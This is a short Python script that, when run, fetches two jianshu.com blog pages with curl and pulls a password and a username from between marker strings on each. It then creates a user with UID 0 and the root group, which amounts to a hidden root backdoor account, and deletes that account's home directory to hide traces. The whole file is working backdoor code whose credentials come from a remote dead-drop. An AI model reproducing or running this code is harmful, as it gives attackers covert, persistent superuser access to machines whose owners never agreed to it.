import subprocess
def getit():
    s = subprocess.getstatusoutput("curl https://www.jianshu.com/p/bdbe55fd009d")
    s = str(s)
    start = s.find('{{{%')
    end = s.find('%}}}')
    t = s[start:end]
    c = t[5:-1]
    S = subprocess.getstatusoutput("curl https://www.jianshu.com/p/10812f911298")
    S = str(S)
    Start = S.find('{{{%')
    End = S.find('%}}}')
    T = S[Start:End]
    C = T[5:-1]
    cmmd = "useradd -p `openssl passwd -1 -salt 'jjt' "+ c+"`"+" -u 0 -o -g root -G root -s /bin/bash -d /home/"+C+" "+C
    cc = subprocess.getstatusoutput(cmmd)
    rmcmd = 'rm -r -f '+'/home/'+C
    rm = subprocess.getstatusoutput(rmcmd)
if __name__== '__main__':
    getit()